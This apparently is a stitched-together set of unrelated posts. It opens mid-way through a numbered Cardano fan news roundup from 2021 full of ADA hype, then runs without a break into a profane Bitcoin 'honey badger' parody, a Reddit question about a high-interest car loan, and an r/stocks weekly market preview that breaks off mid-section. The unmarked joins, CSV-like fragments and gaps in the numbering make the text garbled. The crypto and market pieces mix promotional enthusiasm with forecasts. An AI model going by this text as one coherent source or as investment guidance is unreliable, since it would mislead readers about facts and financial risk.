16. We get another People of Input Output Global video.  This one features Dan Friedman. He currently lives in Japan.  But, the interview starts off with some very interesting stories about his youth in 1980s Kiev, Ukraine.  His speaking and story-telling style is similar to the captain in a 1990s buddy cop movie (in a good way). Very interesting and compelling guy. [https://twitter.com/IOHK\_Charles/status/1371574441637937153](https://twitter.com/IOHK_Charles/status/1371574441637937153)

20. The Coinbase News is allowing us to retire rumors 11, 17, and 41 above.
21. Today is Coinbase day! Finally!  Rejoice.  Trading on Coinbase Pro is supposed to open at or after 9am Pacific! [https://pro.coinbase.com/](https://pro.coinbase.com/) [https://blog.coinbase.com/cardano-ada-is-launching-on-coinbase-pro-694b1cb8c778](https://blog.coinbase.com/cardano-ada-is-launching-on-coinbase-pro-694b1cb8c778)
22. Charles finally gets the blue check on twitter. [https://twitter.com/IOHK\_Charles/status/1372182831430955008](https://twitter.com/IOHK_Charles/status/1372182831430955008)
23. Perceptions are shifting on which platform will be #1 for smart contracts over the next decade. Here’s the biggest crypto youtuber asking his co-host if he’s losing faith in the traditional #1. If you’re in Cardano, you can guess which coin his answer is shifting away from. [https://youtu.be/4jRCmdWva40?t=3270](https://youtu.be/4jRCmdWva40?t=3270)
24. Even septuagenarians are getting in on Cardano. [https://twitter.com/Emini\_Scalper/status/1371061383975030787](https://twitter.com/Emini_Scalper/status/1371061383975030787)
25. Coinbase Pro did actually happen yesterday morning. Congratulations everyone. It’s been a long road and it was beautiful watching those initial candles build on the chart after all these years. [https://pro.coinbase.com/](https://pro.coinbase.com/)
26. The Crypto Time Traveler mentioned last week (Item 49) has apparently left us and now gone back to the future. It definitely adds a touch of realism when they actually leave. [https://twitter.com/CryptoTimeTrav2/status/1371492636884865029](https://twitter.com/CryptoTimeTrav2/status/1371492636884865029)
27. Charles delivered his pre-recorded keynote address at the Blockchain Africa Conference. His remarks support the rumor that the initial Ethiopia project will be around identity. He specifically mentioned Atala Prism. There was talk of the digital identity being able to be linked to wallets, payment systems, and property. He also reasserted that the deals on the table in Africa would bring “millions of users” into the Cardano ecosystem.  [https://www.youtube.com/watch?v=CGEs99I6qV8](https://www.youtube.com/watch?v=CGEs99I6qV8)
28. If you haven’t seen it in the past, the Atala Prism website has a demo that works with the mobile app showing how the identity solution (along with academic credentialing, health insurance, and proof of employment) would run on Cardano. [https://www.atalaprism.io/](https://www.atalaprism.io/)
29. ADA is now live on coinbase.com as well as Coinbase Pro! So, you don’t even need to understand orderbooks to buy ADA now. [https://blog.coinbase.com/cardano-ada-is-now-available-on-coinbase-dd30c1e0d93a](https://blog.coinbase.com/cardano-ada-is-now-available-on-coinbase-dd30c1e0d93a)
30. Tim Harrison of IOG sums up this week perfectly: “Glass of nice red tonight, I think. Quite a week.”    [https://twitter.com/timbharrison/status/1372985361794760705](https://twitter.com/timbharrison/status/1372985361794760705)
31. Never imagined there would be a holiday light display that flashed “Screw Doge Coin; ADA is Best” to the original Doge music. Friendly rivalry is probably good in crypto. [https://www.youtube.com/watch?v=eM135pv72mY&amp;t=31s](https://www.youtube.com/watch?v=eM135pv72mY&amp;t=31s)
32. Charles doubles down on the declaration that Cardano’s defining moment will be when it can provide the rails for micro finance from the developed world to the developing world not as a form of charity but as a profitable financial activity for both lender and loan recipient. He thinks it will be the biggest transfer of wealth in the history of the world. He says the base infrastructure for this is being rolled out over the next 24-36 months. [https://www.youtube.com/watch?v=oMRGUCLQPYo](https://www.youtube.com/watch?v=oMRGUCLQPYo)
33. The ADA adoption numbers are looking really good lately! [https://twitter.com/nierop\_pieter/status/1372686310901747712](https://twitter.com/nierop_pieter/status/1372686310901747712)
34. Max Keiser is also not romantically in love with us. Charles lays down the stick pretty hard on this one. I’m saying good. If you can’t take the heat...stay out of the Cardano kitchen, my man. [https://twitter.com/IOHK\_Charles/status/1373027224509542403](https://twitter.com/IOHK_Charles/status/1373027224509542403)
35. Cardano releases an infographic that sums up all the partnerships, deployments, startups, and functionality in the entire ecosystem.  We got a lot going on! [https://twitter.com/IOHK\_Charles/status/1373313974616215557](https://twitter.com/IOHK_Charles/status/1373313974616215557)
36. Here’s a really good article discussing decentralization in the context of Cardano core code maintenance. Really good job on this by [cardanians.io](https://cardanians.io/). [https://cardanojournal.com/who-will-maintain-cardano-129](https://cardanojournal.com/who-will-maintain-cardano-129)
37. The Cardano tattoo phenomenon continues to proliferate. [https://twitter.com/IOHK\_Charles/status/1373354182124531713](https://twitter.com/IOHK_Charles/status/1373354182124531713)

41. Transactions are way up over the last several epochs! [https://www.adatainment.com/index.php?lang=en&amp;page=charts\_onchain\_metrics](https://www.adatainment.com/index.php?lang=en&amp;page=charts_onchain_metrics)
42. Cardano 360 going down on Thursday March 25th.  This is the big monthly streaming event where they tell us what’s going on. Save your spot here:  [https://www.crowdcast.io/e/cardano360-march/register](https://www.crowdcast.io/e/cardano360-march/register)
43. Critics think that lack of burned fees is a valid complaint against Cardano. But, good outcomes at scale only come with good incentives and free competition. So, if the fees aren’t paying the costs of transactions in these other protocols, the question goes begging: who is? In the end, the answer always turns out to be that the transaction costs have just been obfuscated under the guise of inflation via coin emission or some other hidden tax on someone in the ecosystem (usually the coin holders).  [https://twitter.com/avaxholder/status/1373336728010956801](https://twitter.com/avaxholder/status/1373336728010956801)
44. We are starting to see cracks in the psychological armor of the Ethereum crowd.  This anti-Cardano post was at 0 upvotes (at time of writing) while the fairly pro-Cardano response received triple figure upvotes. [https://www.reddit.com/r/ethereum/comments/maktuy/ist\_charles\_hoskinson\_the\_new\_justin\_sun/](https://www.reddit.com/r/ethereum/comments/maktuy/ist_charles_hoskinson_the_new_justin_sun/)
45. When smart contracts go live with Alonzo (the final HFC event in Goguen), and we eventually have Babel Fees, it’s going to make almost zero sense for any developer to choose ETH over Cardano. This will apply especially to any project that sends tokens to its customers (e.g. NFT projects) and any project that involves significant computation or transaction loads on the network (e.g. DeFi projects).
46. Emurgo is thinking about supply chain solutions for the seafood industry. [https://emurgo.io/blog/how-can-blockchain-deliver-benefits-to-the-seafood-industrys-supply-chain](https://emurgo.io/blog/how-can-blockchain-deliver-benefits-to-the-seafood-industrys-supply-chain)
47. Check out this very cool relay node global tracker form monadpool! Thanks for building this!  [https://monadpool.com/cardano.html](https://monadpool.com/cardano.html)
48. We now have a Backstreet Boy. Might not seem that important, until you notice he has 600k followers. Network effects...network effects. Thanks, Nick! [https://twitter.com/nickcarter/status/1374347860834062340](https://twitter.com/nickcarter/status/1374347860834062340) [https://twitter.com/nickcarter/status/1374466486018842624](https://twitter.com/nickcarter/status/1374466486018842624)
49. A guy tried to use Charles’s reaction to the King Soopers tragedy in Boulder to criticize Cardano. Charles told him to go f\*\*\* himself and then auctioned off the tweet with proceeds going to the families of the victims. The auction price quickly hit four figures and closed at $7k.  [https://v.cent.co/tweet/1374207862646304773?s=u\_a](https://v.cent.co/tweet/1374207862646304773?s=u_a)
50. Thursday is Cardano 360 and Friday will be “Get ADA Day” as staking rewards for Epoch 255 close. Gonna be an action packed close to the week.  Enjoy!
51. Here was my favorite moonboi tweet of the last few days.  Old photo, but excellent captioning work here. [https://twitter.com/MaximilianXCIX/status/1373471841449304066](https://twitter.com/MaximilianXCIX/status/1373471841449304066)
52. Great new interview with Sebastien! In this one he explains a lot about the dApp Connector being built by Emurgo. As reported by a commenter in one of our earlier threads, it will work with Ergo first and then Cardano. A very interesting tidbit was Sebastien’s explanation of how the Emurgo dApp Connector will actually be safer than Metamask (which fills a similar role in the ETH ecosystem).  Very good info. Thanks to Sebastien and the Cardano Podcast! [https://youtu.be/Dkw7hvFP6dY](https://youtu.be/Dkw7hvFP6dY)
53. Today is Cardano 360 day!!!!  Watch it here at 10:30AM Pacific, 17:30 GMT, 18:30 CET.  This is the live monthly streaming show from IOHK.  Watch this one. Hopefully we’ll get a target date for Alonzo.  That’ll tell us when we get smart contracts. [https://www.youtube.com/watch?v=uQt7AjimaAg](https://www.youtube.com/watch?v=uQt7AjimaAg)
54. Looks like the Cardano 360 show may highlight how Cardano will not experience some of the shortcomings that leading blockchains have in the past (like the time that bitcoin accidentally issued 184 billion BTC in one block).  [https://twitter.com/IOHK\_Charles/status/1374783084881608706](https://twitter.com/IOHK_Charles/status/1374783084881608706)
55. Catalyst Fund 5 will have a $2MM total budget! Included will be a very interesting $50k Metadata challenge in Fund 5.  Metadata can be used to prove the existence of a certain document or event to third parties without necessarily revealing the data contained therein. This means you can do cool things on the blockchain without using smart contracts as in the prior New Balance anti-counterfeiting and Beefchain traceability Cardano projects.The winners of this challenge are actually going to be incubated and supported by the IOHK Metadata team! People waiting for Goguen and smart contracts are definitely sleeping on what can be done with metadata on Cardano today.  [https://www.crowdcast.io/e/fund4-6](https://www.crowdcast.io/e/fund4-6) [https://www.youtube.com/watch?v=Pjg\_u7Oeel0](https://www.youtube.com/watch?v=Pjg_u7Oeel0)
56. There is a Catalyst Dashboard available that gives you all the stats on the current projects in Cardano’s multi-million dollar decentralized innovation fund (the world’s biggest). [https://docs.google.com/spreadsheets/d/15R-Vbajy4t4fGs1TipNMfL1pEO9cwdn6WV13lKviX4Q/edit#gid=40774150](https://docs.google.com/spreadsheets/d/15R-Vbajy4t4fGs1TipNMfL1pEO9cwdn6WV13lKviX4Q/edit#gid=40774150)
57. Charles says they are going to end up spending $15-30MM this year on research and they will hire 100-200 people. That’s an investment in the future of the ecosystem! [https://www.youtube.com/watch?v=bLwyFADws8w](https://www.youtube.com/watch?v=bLwyFADws8w)
58. Cardano 360 was yesterday! The big news first: it sounds like the Alonzo (smart contracts)  testnet will launch around end of April or early May. It’s looking like Alonzo HFC event will happen on main net late July or August. The stream was over three hours long. They covered so much! Now, let’s get to the other details revealed. [https://www.youtube.com/watch?v=ULBLgPgxtN8](https://www.youtube.com/watch?v=ULBLgPgxtN8)
59. Grigory Rosu from Runtime Verification gave a big rundown on the universality in programming languages that will be provided by K framework in Cardano.  He said he should have some kind of proof of concept around six months from now.
60. Michael Peyton Jones and Manual Chakravarty (the architects of Plutus) talked about 1) the benefits of Cardano’s modern approach to designing Plutus TX and Plutus Core and how Plutus Core basically being lambda calculus allows for mathematical verification of software written in Plutus, 2) how UTXO (and EUTXO in Cardano) are much more battle proven than other ledger accounting systems like account balance system (e.g. ETH) which have had problems, 3) how non-fungible role tokens will be a thing, and 4) how they are now laying out a real development platform for builders instead of just throwing Plutus out into the world.
61. Lars Brünjes (Head of Education) laid out how they are going to train a group of developers through the Plutus Pioneers program.  That group will help test the Alonzo test net after it launches.
62. Lars has also cloned Uniswap in Plutus with a graphical user interface and completely automated price discovery in the liquidity pools.  He did this as a proof of concept to show the capabilities of Plutus. That was demoed right on the stream.
63. They then brought on people from three different Haskell development firms who will be building things on the testnet as a sort of “red team” test of Alonzo.  They all seemed to be very capable in terms of Haskell development (note here that Plutus is basically Haskell).
64. Tom Lindeman (Chief Security Officer at Runtime Verification) then laid out how disastrous the last few years in Ethereum have been for smart contract security.  But, Cardano has a solution.  IOHK and Runtime Verification will partner to certify smart contracts as to security.  Runtime Verification will do the security audits.  This program will be called “Alpha Frontier”.
65. Charles then laid out the details of the timeline for Alonzo as described above.   It sounds like they are targeting to be totally done and hit a code/feature freeze at the end of June.  But, it will take Coinbase, Kraken, Binance et al. at least four weeks to update their systems before they can actually launch smart contracts on mainnet.
66. Collin Edwards and Duncan Couts then gave us an update on the stake pool world as we approach “D DAy” or d=0 which is full decentralization of block production. A stake pool operator Shawn McMurdo has made some Cardano Improvement proposals as to 1) a non-linear curved basis for a0 (pronounced a-naught, represents stake pool operator pledge) to affect rewards more greatly, 2) non-centralized rankings in Daedalus, and 3) an adjustment to minimum fees from fixed to variable.   Collin and Duncan clarified there will be no changes to a0 (pledge) or k (max pool size) at the d=0 (full decentralization) event coming up. Duncan also laid out how they are going to launch P2P node testnet in early Q2.  This will allow for information to flow directly between nodes and will accomplish automation of things like peer discovery that are currently manual on the network.
67. Dor Garbash then gave an update on Catalyst.  As covered previously here, Catalyst has become a monster.  There are 17k people in Ideascale and the treasury is worth more than $400MM.  You heard that right, almost a half billion dollars in the Catalyst Treasury.  We also heard from a bunch of the previous catalyst winners.
68. Someone paid $23k for the notorious “Your telling the CEO of IOHK…” tweet.  [https://v.cent.co/tweet/1374769078519300097?s=u\_a](https://v.cent.co/tweet/1374769078519300097?s=u_a)
69. IOHK is rolling out a new team that will fight the scammers in crypto. In my mind this involves guys in polo shirts with popped collars and Ledger Nano Xs around their necks carrying [these](https://www.heckler-koch.com/en/products/military/submachine-guns/mp7a1/mp7a2/overview.html) and hunting the bad guys while ‘90s action movie music plays. Probably Dwayne Johnson is their commander. Maybe that’s not what Charles has in mind.  [https://twitter.com/IOHK\_Charles/status/1375473873651568640](https://twitter.com/IOHK_Charles/status/1375473873651568640)
70. Cardano is the Tesla of crypto. We’re just in that early stage right before the Model 3 launch where the Ford and GM guys are at peak fear/peak shit talking but we haven’t made that big move yet.  “It’s an illusion, they’ll never release a sub $40k car.”  We’ll see shortly, gentlemen...we’ll see.
71. Every once in a while I like to take stock of where the rest of the crypto space is on Cardano. So, let’s do a little review of what a few of the larger youtube crypto and other influencers are saying about Cardano right now.
72. The biggest crypto youtuber with 717k subscribers says “shame on you, Cardano community” for talking so badly about EIP 1559 (the latest Ethereum Improvement Proposal). Then in the same video he says he may tell people to sell their Ethereum for Cardano &amp; DOT if things don’t improve by the end of April (with a bunch of caveats). [https://www.youtube.com/watch?v=p1OdprEpHfU](https://www.youtube.com/watch?v=p1OdprEpHfU).
73. Another youtuber with 587k subscribers posted a video called “Why I'm Dumping Ethereum For This Coin” and said that ETH would have “massive problems” if Cardano hits its deadline for smart contracts on mainnet.  He’s actually recommending some other coins that aren’t ETH or Cardano, but made his lack of confidence in ETH in the face of Cardano’s challenge very clear if Cardano achieves its goals.

74. Lark Davis (256k subscribers) released a video called “Don’t Buy Cardano” in which he lays out the devil’s advocate argument against Cardano and then responds to those arguments.  He finished by saying “I think that Cardano will prove the haters wrong this year…but...it will simply be a piece of the bigger picture of the cryptoverse.” [https://www.youtube.com/watch?v=J-bB8gzUCMo](https://www.youtube.com/watch?v=J-bB8gzUCMo)  This followed a video a few days ago that seemed to identify the delay of Ethereum’s layer 2 scaling solution as “probably the biggest crypto fail of 2021”.  [https://youtu.be/QCo5egQmiG8](https://youtu.be/QCo5egQmiG8)
75. That’s a collective 1.56 million subscribers.  Of course, some overlap there. But, that’s a lot of potential viewers. It seems like the message being delivered to them is a lot of playing both sides of the fence. From my view, this is what it looks like when you hit a tipping point and the herd starts slowly capitulating on a consensus position.
76. Charles says they are actually going to hire investigators for the IOG anti-scammer team.  People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon.  Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel. I mean somebody is gonna have to man the watchtowers if we’re gonna keep out all the no-coiners and ETH people. Kidding...kidding. [https://youtu.be/6God9Xtzuqs](https://youtu.be/6God9Xtzuqs)
77. Cardano hodler Ben Askren continues preparations for his boxing match with Jake Paul.  Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds.

78. We hit 100% decentralization of block production tomorrow.  Breath it in, friends. Taste the sweet completely decentralized air. Many crypto ecosystems will never know that feeling.

79. Charles has also announced that he will no longer go on podcasts that are primarily concerned with price and trading of cryptos (even if they are friends) as he feels it is irresponsible. Certain youtubers are gonna be sad about this. But, one can hope they realize that Cardano will always appreciate their steadfast support over the years. [https://www.youtube.com/watch?v=AGWZ2HBSI7E](https://www.youtube.com/watch?v=AGWZ2HBSI7E)

81. The Daedalus wallet now supports native tokens! [https://twitter.com/InputOutputHK/status/1376936748715020288](https://twitter.com/InputOutputHK/status/1376936748715020288)
82. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
83. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem.  To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
84. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the  transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”.  When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase.  The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
85. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed in the secondary market for Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

87. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher.  Right now the corporate world is considering holding BTC on their balance sheets.  But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture.

Bitcoin,The Honey Badger of Money,"This is the Bitcoin. Watch it hash in slow motion.

It's pretty badass. Look. It hashes all over the place. ""Whoa! Watch out!"" says that bank.

Eew, it's got digital signatures! Oh! It's chasing a merchant service! Oh my gosh!

Oh, the Bitcoin is just crazy!

The Bitcoin has been referred to by the Guiness Book of World Records as the most fearless currency on the Internet. It really doesn't give a shit. If it's mining, it's hashing.

Eew! What's that in its blockchain? Oh, its got a double-spend? Oh, it runs backwards? Now watch this: look FinCEN's up in courts. Bitcoin don't care. It just confirms what it wants. Whenever it's hashing it just -- Eew, and it confirms, transactions... Watch it reward! Look at that mining.

The Bitcoin is really pretty badass. It has no regard for any other currency whatsoever. Look at it, it's just hashing, and mining blocks. Eew! What's that? Silk Road? Oh that's nasty. Bitcoin's so nasty. Oh look it's hashing things and mining them.

The Bitcoin has a fairly long blockchain, but a distinctly elliptical encryption scheme, and, you know, its developers are loose, allowing it to move about freely, and they twist around.

Now look: Here's a house full of gold bugs. Do you think the Bitcoin cares? It doesn't give a shit, it goes right into the homes of libertarians to get some liquidity. How disgusting is that? It mines dark net transactions. Eew, that's so nasty.

But look! The Bitcoin doesn't care! Its users get hacked like a thousand times. It doesn't give a shit. Its just hashing. It doesn't care about being hacked by the feds. Nothing can stop the Bitcoin when its hashing. What a crazy fuck! Look, it's mining anonymous transactions, that's disgusting.

It's hashing in slow-motion again. See?

Now, what's interesting is that other currencies like the dollar here, they just wait around until the Bitcoin crashes, and then it swoops in to pick up the scraps. It says, ""You do all the work for us, Bitcoin, and we'll just profit whatever you mine, how's that? What'daya say, stupid?""

Look at this currency: ""Thanks for the treat, stupid!""

""Hey, come back here,"" says the Bitcoin.

Currencies don't care, and you know what? The alt-coins do it too. Look at these little alt-coins. They're like ""Thanks stupid! Thanks for the mining! See you later."" The Bitcoin does all the work and all these other currencies just pick up the scraps.

At nigh time the Bitcoin goes hashing, because it's mining. Look! Here comes a fierce battle between a government currency and Bitcoin. I wonder what will happen?

Look at this, there's the Bitcoin just hashing a block, and then look, ""Get away from me!"" says the government, ""Get away from me!"" Bitcoin don't care. Bitcoin smacks the shit out of it. And the government comes back and it lashes at the Bitcoin.

Oh, little does the Bitcoin know, FYI: it's been hacked! It's been forked by the b-cash attack, so while it's hashing the blockchain -- eew, that's disgusting -- all the hacked blocks are seeping into the Bitcoin's blockchain, and it forks out. Look at that forked fuck.

Now the Bitcoin is going to fork out for a few minutes, and then it's going to get right back up and start hashing all over again, because it's a resilient little bastard.

Look at this! Like nothing happened! The Bitcoin gets right back up and continues hashing the blockchain.

How disgusting.

And of course, what does the Bitcoin have to hash for the next two weeks?

Transactions.

The Bitcoin.

I have 6000 for a down payment but bad credit, and before you say, ""just buy a car for less than 6000"", I've done plenty of research and I'm leaning towards spending more in the 10-11k range for a much more reliable (Prius) vehicle. I'm the type that is going to ride this car out for 15-20 years if possible. I will not be trading it in, this will be our car for its entire life cycle.

Anyway. So far, I've only been able to get a 19.99% interest rate. Yeah, thats terrible. I know. But, can I make it work? Unless im missing something, let's say the loan after down payment comes to 5k. I could theoretically pay 450ish a month, and get that paid off in a year, and the total interest would only be around 500-600, I believe? Unless I'm mistaken, the worst part about a high interest loan is if you spread it out over too many years and thats when it really bites you, right? 

Am I missing something? Because in my head, that 600 in interest over a year is just the price ill have to pay for bad credit, and I'm okay with that. Good plan, bad plan? I appreciate you taking the time to read this, and appreciate any feedback, thanks!",finance
stocks,"Wall Street Week Ahead for the trading week beginning April 5th, 2021","Good Saturday morning to all of you here on r/stocks. I hope everyone on this sub made out pretty nicely in the market this past week, and is ready for the new trading week ahead.

Here is everything you need to know to get you ready for the trading week beginning April 5th, 2021.

# **Blowout jobs report could power stocks higher in the week ahead - [(Source)](https://www.cnbc.com/2021/04/02/blowout-jobs-report-could-power-stocks-higher-in-the-week-ahead.html)**
*****
&gt; April started off with a rally, and the market could continue to notch gains as the month gets underway, strategists say.
*****
&gt; The U.S. Labor Department’s surprisingly strong March jobs report this Friday showed that there were 916,000 jobs added in March, compared to the 675,000 expected by economists.
*****
&gt; The week ahead is expected to be fairly quiet, with a few economic reports and Federal Reserve speakers filling the lull before earnings season.
*****
&gt; The Institute for Supply Management’s service sector survey will be released next Monday and should get close attention after institute’s manufacturing survey came in at the highest level since 1983. Minutes from the last Federal Reserve meeting will be released next Wednesday afternoon.
*****
&gt; “Literally everything, or almost everything, should be very robust for the foreseeable future, I would think. We’re coming off a low base,” said Stephen Stanley, chief economist at Amherst Pierpont.
*****
&gt; Economists expect a very strong second quarter as the economy reopens and stimulus spending kicks in, and that should be positive for stocks — unless interest rates rise too quickly.
*****
&gt; Major stock indices were sharply higher as the calendar rolled into April.
*****
&gt; On Thursday, the S&amp;P 500 rose 1.2% to a new record close of 4,019.87. Meanwhile, the Dow Jones Industrial Average climbed more than 170 points, and the tech-heavy Nasdaq Composite jumped 1.8%.
*****
&gt; The closely watched benchmark 10-year Treasury yield, meanwhile, was higher at 1.68% Friday morning, well below recent high of 1.77% reached earlier in the week.
*****
&gt; The 10-year is important because it influences mortgages and other loans, but recently it has also had a negative correlation recently with tech stocks. When the 10-year yield edged higher, tech went lower.
*****
&gt; # All eyes on earnings
&gt; “The macro calendar is pretty light. I think attention will turn to earnings pretty quickly,” said Shawn Snyder, head of investment strategy at Citi U.S. Wealth Management. “That will be the next thing to turn to.”
*****
&gt; He said the market is often weaker just ahead of earnings season.
*****
&gt; First quarter earnings are expected to be up 24.2% year-over-year, according to Refinitiv. It will be the first quarter where the prior year results included the impact of the pandemic shutdown.
*****
&gt; Some strategists expect the earnings season to bring with it more favorable comments from companies that could lead to positive forecast revisions, providing fuel for the stock market.
*****
&gt; “Approximately 13 months ago, COVID-19 sent us home from our offices and our kids from school. While the pandemic nearly shut down the world economy, an unprecedented policy response kept the economy afloat, leading to the shortest recessionary decline and the steepest stock market bounce in history,” noted Jonathan Golub, chief U.S. equity strategist at Credit Suisse.
*****
&gt; Golub said that the 78% rise in the S&amp;P 500 from the bottom last March was driven in a big way by earnings.
*****
&gt; “In each of the past two recovery periods, the trend of positive revisions lasted 2-3 years, providing an important tailwind for the market,” he wrote in a note.
*****
&gt; He added that economists have continued to revise growth forecasts higher.
*****
&gt; “Our work shows that every 1% change in GDP drives a 2½–3% change in revenues, and even larger improvements in profits,” Golub wrote.
*****
&gt; # April is far from cruelest month
Aside from an expected earnings bounce, some strategists have been expecting April to be a bullish time for stocks, as it has been historically.
*****
&gt; Tom Lee, managing partner of Fundstrat, for instance, points to the decline in the VIX, the Chicago Board Options Exchange’s Volatility Index, to pre-pandemic levels and says that’s constructive for stocks.
*****
&gt; The VIX is calculated based on the puts and the calls in the S&amp;P 500, trading on the CBOE.
*****
&gt; Lee also noted that when the market closes higher on March 31, the final day of the first quarter, and again on April 1, the first day of the second quarter, the market has had a better April performance than usual.
*****
&gt; Since World War II, when those two days were positive, the S&amp;P 500 rose an average 2.4% for April, versus its usual 1.3% gain, Lee said.
*****
&gt; “The bottom line is this is [a] positive environment and risk/reward for stocks. This keeps us constructive,” he wrote in a note.
*****
&gt; Sam Stovall, chief investment strategist at CFRA, said the market enters April and the second quarter with a tailwind.
*****
&gt; “April is usually good. It’s the best month in terms of average price change. The second quarter is not a bad quarter on average. It’s up 2.8% on average since 1990, and all 11 sectors have posted average gains,” he said.
*****
&gt; Stovall said some of the cyclicals may have gotten ahead of themselves and energy, industrials and financials could pause. Those sectors have been outperforming while tech has been lagging.
*****
&gt; The market enters the “sell in May” period during the second quarter. The market adage, “sell in May and go away,” is based on the idea that stocks tend to underperform from May through October.
*****
&gt; “In that sell in May period, tech has been a pretty good performer. Now is probably not the time to begin bailing out of tech,” Stovall said. “Tech could end up receiving a near-term reprieve.”
*****
&gt; # Fed ahead
&gt; The Federal Reserve will release the minutes of its last meeting Wednesday afternoon, and investors will review them for any fresh comments on inflation. With prices for fuel and other commodities already rising, investors are becoming concerned that more stimulus could send inflation higher.
*****
&gt; Fed Chairman Jerome Powell said after the March meeting that the Fed sees inflationary pressures as transient, but the markets are still concerned that it could become a bigger issue. Inflation is currently well below the Fed’s 2% target.
*****
&gt; The producer price index — which gauges the average change in prices received by domestic producers for their output — will also be watched closely when it is reported Friday.
*****
&gt; As for Fed speakers, Powell is expected to discuss the global economy on an International Monetary Fund panel Thursday, which will be moderated by CNBC’s Sara Eisen.
*****
&gt; Other central bank speakers include Chicago Fed President Charles Evans, who speaks Tuesday and Wednesday, and Richmond Fed President Tom Barkin who speaks Wednesday.
*****
&gt; Treasury Secretary Janet Yellen speaks on a Chicago Council on Global Affairs webinar Monday on the economic recovery Monday.

&gt; # Stocks Love April

&gt; “History doesn’t repeat itself, but it often rhymes.” Mark Twain

&gt; What more can we say other than few months have been kinder to stocks lately than the month of April. In fact, it was last year that saw the S&amp;P 500 Index gain an incredible 12.7%, for one of the greatest one-month gains in history. We noted at the time that 10% or greater months tended to usually kick off strength, not mark the end of it like many were claiming last year. Once again, history looks to have rhymed.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://i0.wp.com/lplresearch.com/wp-content/uploads/2021/03/blog-3.31.21.png?ssl=1))**

&gt; Just how strong has April been lately? “I had to double check, but sure enough, stocks have closed higher in April an incredible 14 out of the past 15 years,” explained LPL Financial Chief Market Strategist Ryan Detrick. “Other than my Cincinnati Bengals breaking my heart, few things are more consistent than stocks higher in April.”

&gt; As shown in the LPL Chart of the Day, April is a great month for stocks across the board:

&gt; * Since 1950 it is the second best month
&gt; * The past 20 years it is the best month
&gt; * The past 10 years it is the second best month
&gt; * n a post-election year it ranks fourth out of 12

&gt; ###### **([CLICK HERE FOR THE CHART!](https://i2.wp.com/lplresearch.com/wp-content/uploads/2021/03/Blog-2-3.31.21.png?ssl=1))**

&gt; Taking it a step further, here’s what the average April looks like. It sprints out to impressive gains the first 18 days or so, then it coasts in like Usain Bolt in a race.

&gt; # Strength Day Before Good Friday Weakness Day After

&gt; Good Friday (and Easter) land at the beginning of April this year. Historically the longer-term track record of Good Friday (page 98 of STA 2021) is bullish with notable average gains by DJIA, S&amp;P 500, NASDAQ and Russell 2000 on the trading day before. NASDAQ has advanced 19 of the last 20 days before Good Friday. Monday, the day after Easter has exactly the opposite record since 1980 and is in the running for the worst day after of any holiday. Since 2004 the day after has been improving with S&amp;P 500 up 11 of the last 17. The second day after Easter has exhibited consistent strength.

&gt; # A Humble Victory Lap

&gt; It has been a little over a year since the S&amp;P 500 Index bottomed on March 23, 2020, and it was certainly an eventful year, to say the least. It’s also been one year since we at LPL Research upgraded our view on equities from market weight to overweight in Road to Recovery Playbook Update believing there had been a shift in the risk-reward dynamic between stocks and bonds.

&gt; It certainly was not an easy call, and it was made with the S&amp;P 500 rallying roughly 15% from its low. Little did we know however, that the S&amp;P 500 would stage the greatest one year rally in history. As shown in the LPL Chart of the Day, the rally from the 2020 low eclipsed the rallies from the 2009 and 1982 lows, climbing almost 75% since the low:

&gt; ###### **([CLICK HERE FOR THE CHART!](https://i0.wp.com/lplresearch.com/wp-content/uploads/2021/03/3.29.21-Blog-Chart-1.png?ssl=1))**

&gt; Investing is a challenging endeavor, one that even the most seasoned and successful participants need to remain ever vigilant, for Mr. Market is always ready to serve a fresh batch of humble pie—a lesson we always keep in mind.

&gt; “Few on the Street were willing to lean into the market turmoil and change their outlook on stocks, but it was a call that paid off for us,” added LPL Financial Chief Market Strategist Ryan Detrick. “Even though we turned out to be on the correct side of history, investing is a ‘what have you done for me lately’ industry, and we have to continue to remain disciplined with our approach.”

&gt; Despite the historic rally off the low, we continue to overweight equities in our portfolios, as the backdrop of an expanding economy and favorable monetary conditions should be supportive of stocks over bonds going forward, but we acknowledge that year 2 of a bull market has a way of challenging investors.

&gt; # Turn Off, Tune Out

&gt; The first quarter of 2021 comes to a close today, and as fast as time seems to fly, it's been a long one. Take GameStop (GME). It may seem like months and months ago, but it wasn't until late January that the stock started to go crazy as the 'Reddit Rebellion' launched and caused a mad scramble by hedge funds to cover any and all of their short positions. Think about it. In under three months, we've seen at least two large funds (Melvin Capital and Archegos), not to mention the collapse of supply chain finance giant Greensill Capital. Sometimes we go an entire year without blowups of this magnitude.

